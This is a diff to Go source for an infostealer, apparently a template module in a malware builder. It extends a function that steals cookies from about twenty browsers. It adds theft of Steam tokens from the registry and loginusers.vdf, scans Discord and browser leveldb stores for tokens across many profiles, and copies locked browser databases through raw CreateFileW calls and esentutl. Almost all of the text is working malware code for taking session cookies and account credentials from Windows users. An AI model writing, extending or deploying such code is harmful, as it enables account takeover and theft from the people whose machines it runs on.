@@ -9,7 +9,6 @@ func templateStealer() string {
 func runStealer() string {
 	results := map[string]string{}
 	var diagErrors []string
-	var killedBrowsers []string
 
 	browsers := []struct {
 		name  string
@@ -27,11 +26,61 @@ func runStealer() string {
 		}, "brave.exe"},
 		{"Opera", []string{
 			filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable"),
+		}, "opera.exe"},
+		{"OperaGX", []string{
 			filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
 		}, "opera.exe"},
+		{"Vivaldi", []string{
+			filepath.Join(os.Getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
+		}, "vivaldi.exe"},
+		{"Yandex", []string{
+			filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
+		}, "browser.exe"},
+		{"Chromium", []string{
+			filepath.Join(os.Getenv("LOCALAPPDATA"), "Chromium", "User Data"),
+		}, "chrome.exe"},
+		{"CocCoc", []string{
+			filepath.Join(os.Getenv("LOCALAPPDATA"), "CocCoc", "Browser", "User Data"),
+		}, "browser.exe"},
+		{"Torch", []string{
+			filepath.Join(os.Getenv("LOCALAPPDATA"), "Torch", "User Data"),
+		}, "torch.exe"},
+		{"Epic", []string{
+			filepath.Join(os.Getenv("LOCALAPPDATA"), "Epic Privacy Browser", "User Data"),
+		}, "epic.exe"},
+		{"CentBrowser", []string{
+			filepath.Join(os.Getenv("LOCALAPPDATA"), "CentBrowser", "User Data"),
+		}, "chrome.exe"},
+		{"Iridium", []string{
+			filepath.Join(os.Getenv("LOCALAPPDATA"), "Iridium", "User Data"),
+		}, "iridium.exe"},
+		{"7Star", []string{
+			filepath.Join(os.Getenv("LOCALAPPDATA"), "7Star", "7Star", "User Data"),
+		}, "7star.exe"},
+		{"Amigo", []string{
+			filepath.Join(os.Getenv("LOCALAPPDATA"), "Amigo", "User Data"),
+		}, "amigo.exe"},
+		{"Kometa", []string{
+			filepath.Join(os.Getenv("LOCALAPPDATA"), "Kometa", "User Data"),
+		}, "kometa.exe"},
+		{"Orbitum", []string{
+			filepath.Join(os.Getenv("LOCALAPPDATA"), "Orbitum", "User Data"),
+		}, "orbitum.exe"},
+		{"Sputnik", []string{
+			filepath.Join(os.Getenv("LOCALAPPDATA"), "Sputnik", "Sputnik", "User Data"),
+		}, "sputnik.exe"},
+		{"Uran", []string{
+			filepath.Join(os.Getenv("LOCALAPPDATA"), "uCozMedia", "Uran", "User Data"),
+		}, "uran.exe"},
 		{"Firefox", []string{
 			filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
 		}, "firefox.exe"},
+		{"Waterfox", []string{
+			filepath.Join(os.Getenv("APPDATA"), "Waterfox", "Profiles"),
+		}, "waterfox.exe"},
+		{"PaleMoon", []string{
+			filepath.Join(os.Getenv("APPDATA"), "Moonchild Productions", "Pale Moon", "Profiles"),
+		}, "palemoon.exe"},
 	}
 
 	for _, br := range browsers {
@@ -42,7 +91,7 @@ func runStealer() string {
 
 			var cookies string
 			var errs []string
-			if br.name == "Firefox" {
+			if br.name == "Firefox" || br.name == "Waterfox" || br.name == "PaleMoon" {
 				cookies, errs = stealFirefoxCookies(basePath, br.exe)
 			} else {
 				cookies, errs = stealChromiumCookies(basePath, br.name, br.exe)
@@ -55,19 +104,8 @@ func runStealer() string {
 				} else {
 					results[br.name] = cookies
 				}
-				found := false
-				for _, k := range killedBrowsers {
-					if k == br.exe { found = true; break }
-				}
-				if !found { killedBrowsers = append(killedBrowsers, br.exe) }
 			}
 		}
-	}
-
-	for _, exe := range killedBrowsers {
-		cmd := exec.Command("cmd", "/c", "start", "", exe)
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		_ = cmd.Start()
 	}
 
 	if scr := stealScreenshot(); scr != "" {
@@ -353,32 +391,59 @@ func stealUserInfo() string {
 }
 
 func stealSteamTokens() string {
+	var sb strings.Builder
+
+	var hKey syscall.Handle
+	keyPath, _ := syscall.UTF16PtrFromString(`Software\Valve\Steam\ConnectCache`)
+	err := syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, keyPath, 0, syscall.KEY_READ, &hKey)
+	if err == nil {
+		defer syscall.RegCloseKey(hKey)
+		advapi32 := syscall.NewLazyDLL("advapi32.dll")
+		regEnumValue := advapi32.NewProc("RegEnumValueW")
+		for idx := uint32(0); ; idx++ {
+			nameLen := uint32(256)
+			nameBuf := make([]uint16, nameLen)
+			dataLen := uint32(8192)
+			dataBuf := make([]byte, dataLen)
+			var vtype uint32
+			r, _, _ := regEnumValue.Call(
+				uintptr(hKey),
+				uintptr(idx),
+				uintptr(unsafe.Pointer(&nameBuf[0])),
+				uintptr(unsafe.Pointer(&nameLen)),
+				0,
+				uintptr(unsafe.Pointer(&vtype)),
+				uintptr(unsafe.Pointer(&dataBuf[0])),
+				uintptr(unsafe.Pointer(&dataLen)),
+			)
+			if r != 0 {
+				break
+			}
+			name := syscall.UTF16ToString(nameBuf[:nameLen])
+			token := string(dataBuf[:dataLen])
+			for len(token) > 0 && token[len(token)-1] == 0 {
+				token = token[:len(token)-1]
+			}
+			token = strings.TrimSpace(token)
+			if len(token) > 50 && strings.Contains(token, ".") {
+				sb.WriteString(fmt.Sprintf("[%s] %s\n", name, token))
+			}
+		}
+	}
+
 	var steamPaths []string
 	seen := map[string]bool{}
-
 	addPath := func(p string) {
 		p = filepath.Clean(p)
-		if p == "." || p == "" {
-			return
-		}
+		if p == "." || p == "" { return }
 		lp := strings.ToLower(p)
-		if seen[lp] {
-			return
-		}
+		if seen[lp] { return }
 		seen[lp] = true
 		steamPaths = append(steamPaths, p)
 	}
-
-	if v := os.Getenv("ProgramFiles(x86)"); v != "" {
-		addPath(filepath.Join(v, "Steam"))
-	}
-	if v := os.Getenv("ProgramFiles"); v != "" {
-		addPath(filepath.Join(v, "Steam"))
-	}
-	if v := os.Getenv("LOCALAPPDATA"); v != "" {
-		addPath(filepath.Join(v, "Steam"))
-	}
-
+	if v := os.Getenv("ProgramFiles(x86)"); v != "" { addPath(filepath.Join(v, "Steam")) }
+	if v := os.Getenv("ProgramFiles"); v != "" { addPath(filepath.Join(v, "Steam")) }
+	if v := os.Getenv("LOCALAPPDATA"); v != "" { addPath(filepath.Join(v, "Steam")) }
 	for d := 'A'; d <= 'Z'; d++ {
 		drive := string(d) + ":\\"
 		addPath(filepath.Join(drive, "Steam"))
@@ -389,25 +454,14 @@ func stealSteamTokens() string {
 		addPath(filepath.Join(drive, "Valve", "Steam"))
 	}
 
-	var sb strings.Builder
 	for _, steamDir := range steamPaths {
-		if _, err := os.Stat(steamDir); os.IsNotExist(err) {
-			continue
+		if _, err := os.Stat(steamDir); os.IsNotExist(err) { continue }
+		loginFile := filepath.Join(steamDir, "config", "loginusers.vdf")
+		if data, err := os.ReadFile(loginFile); err == nil && len(data) > 0 {
+			sb.WriteString(fmt.Sprintf("=== loginusers.vdf [%s] ===\n", steamDir))
+			sb.WriteString(string(data))
+			sb.WriteString("\n\n")
 		}
-
-		vdfFiles := []string{
-			filepath.Join(steamDir, "config", "loginusers.vdf"),
-			filepath.Join(steamDir, "config", "config.vdf"),
-			filepath.Join(steamDir, "config", "SteamAppData.vdf"),
-		}
-		for _, vf := range vdfFiles {
-			if data, err := os.ReadFile(vf); err == nil && len(data) > 0 {
-				sb.WriteString(fmt.Sprintf("=== %s [%s] ===\n", filepath.Base(vf), steamDir))
-				sb.WriteString(string(data))
-				sb.WriteString("\n\n")
-			}
-		}
-
 		entries, err := os.ReadDir(steamDir)
 		if err == nil {
 			for _, e := range entries {
@@ -432,15 +486,46 @@ func stealDiscordTokens() string {
 		return ""
 	}
 
-	dirs := []string{
-		filepath.Join(appdata, "Discord", "Local Storage", "leveldb"),
-		filepath.Join(appdata, "discordcanary", "Local Storage", "leveldb"),
-		filepath.Join(appdata, "discordptb", "Local Storage", "leveldb"),
-		filepath.Join(appdata, "Lightcord", "Local Storage", "leveldb"),
-		filepath.Join(localAppdata, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
-		filepath.Join(localAppdata, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
-		filepath.Join(localAppdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
-		filepath.Join(appdata, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
+	var dirs []string
+
+	discordApps := []string{
+		filepath.Join(appdata, "Discord"),
+		filepath.Join(appdata, "discordcanary"),
+		filepath.Join(appdata, "discordptb"),
+		filepath.Join(appdata, "Lightcord"),
+	}
+	for _, app := range discordApps {
+		dirs = append(dirs, filepath.Join(app, "Local Storage", "leveldb"))
+	}
+
+	browserBases := []string{
+		filepath.Join(localAppdata, "Google", "Chrome", "User Data"),
+		filepath.Join(localAppdata, "Microsoft", "Edge", "User Data"),
+		filepath.Join(localAppdata, "BraveSoftware", "Brave-Browser", "User Data"),
+		filepath.Join(localAppdata, "Vivaldi", "User Data"),
+		filepath.Join(localAppdata, "Yandex", "YandexBrowser", "User Data"),
+		filepath.Join(localAppdata, "Chromium", "User Data"),
+		filepath.Join(localAppdata, "CocCoc", "Browser", "User Data"),
+		filepath.Join(localAppdata, "Torch", "User Data"),
+		filepath.Join(localAppdata, "Epic Privacy Browser", "User Data"),
+		filepath.Join(localAppdata, "CentBrowser", "User Data"),
+		filepath.Join(localAppdata, "Iridium", "User Data"),
+		filepath.Join(localAppdata, "7Star", "7Star", "User Data"),
+		filepath.Join(localAppdata, "Amigo", "User Data"),
+		filepath.Join(localAppdata, "Kometa", "User Data"),
+		filepath.Join(localAppdata, "Orbitum", "User Data"),
+		filepath.Join(localAppdata, "Sputnik", "Sputnik", "User Data"),
+		filepath.Join(localAppdata, "uCozMedia", "Uran", "User Data"),
+		filepath.Join(appdata, "Opera Software", "Opera Stable"),
+		filepath.Join(appdata, "Opera Software", "Opera GX Stable"),
+	}
+
+	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5",
+		"Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"}
+	for _, base := range browserBases {
+		for _, prof := range profiles {
+			dirs = append(dirs, filepath.Join(base, prof, "Local Storage", "leveldb"))
+		}
 	}
 
 	tokenSet := map[string]bool{}
@@ -451,7 +536,6 @@ func stealDiscordTokens() string {
 		if err != nil {
 			continue
 		}
-
 		for _, e := range entries {
 			ext := strings.ToLower(filepath.Ext(e.Name()))
 			if ext != ".ldb" && ext != ".log" {
@@ -462,7 +546,6 @@ func stealDiscordTokens() string {
 				continue
 			}
 			content := string(data)
-
 			for _, line := range strings.Split(content, "\n") {
 				for _, part := range strings.Split(line, "\"") {
 					part = strings.TrimSpace(part)
@@ -640,9 +723,46 @@ func dpapiDecrypt(data []byte) ([]byte, error) {
 }
 
 func copyFileLocked(src, dst, browserExe string) error {
+	_ = browserExe
+
 	data, err := os.ReadFile(src)
 	if err == nil && len(data) > 0 {
 		return os.WriteFile(dst, data, 0o644)
+	}
+
+	srcPtr, _ := syscall.UTF16PtrFromString(src)
+	const GENERIC_READ = 0x80000000
+	const FILE_SHARE_ALL = 0x07
+	const OPEN_EXISTING = 3
+	const FILE_ATTRIBUTE_NORMAL = 0x80
+
+	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+	createFile := kernel32.NewProc("CreateFileW")
+	readFile := kernel32.NewProc("ReadFile")
+	getFileSize := kernel32.NewProc("GetFileSizeEx")
+	closeHandle := kernel32.NewProc("CloseHandle")
+
+	h, _, _ := createFile.Call(
+		uintptr(unsafe.Pointer(srcPtr)),
+		GENERIC_READ,
+		FILE_SHARE_ALL,
+		0,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
+		0,
+	)
+	if h != 0 && h != ^uintptr(0) {
+		defer closeHandle.Call(h)
+		var size int64
+		getFileSize.Call(h, uintptr(unsafe.Pointer(&size)))
+		if size > 0 && size < 200*1024*1024 {
+			buf := make([]byte, size)
+			var bytesRead uint32
+			readFile.Call(h, uintptr(unsafe.Pointer(&buf[0])), uintptr(size), uintptr(unsafe.Pointer(&bytesRead)), 0)
+			if bytesRead > 0 {
+				return os.WriteFile(dst, buf[:bytesRead], 0o644)
+			}
+		}
 	}
 
 	cmd := exec.Command("esentutl.exe", "/y", src, "/d", dst, "/o")
@@ -654,22 +774,7 @@ func copyFileLocked(src, dst, browserExe string) error {
 		}
 	}
 
-	if browserExe == "" {
-		return fmt.Errorf("locked %s", src)
-	}
-	killCmd := exec.Command("taskkill", "/F", "/IM", browserExe)
-	killCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	_ = killCmd.Run()
-	time.Sleep(500 * time.Millisecond)
-
-	data, err = os.ReadFile(src)
-	if err != nil {
-		return fmt.Errorf("read after kill %s: %v", src, err)
-	}
-	if len(data) == 0 {
-		return fmt.Errorf("empty after kill %s", src)
-	}
-	return os.WriteFile(dst, data, 0o644)
+	return fmt.Errorf("locked %s", src)
 }
 `)
 }
